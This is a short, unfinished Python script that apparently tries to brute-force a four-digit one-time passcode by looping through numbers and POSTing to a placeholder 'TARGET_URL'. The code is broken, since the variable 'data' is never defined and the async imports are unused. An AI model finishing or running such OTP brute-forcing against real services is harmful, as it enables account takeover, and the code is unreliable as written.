import requests
import asyncio
from aiohttp import ClientSession


def OTP():
    #return requests.get("http://httpbin.org/get")
    for i in range(1000,9999):
        print(data)
        r=requests.post("TARGET_URL",data=data)
        print(r.text)

OTP()
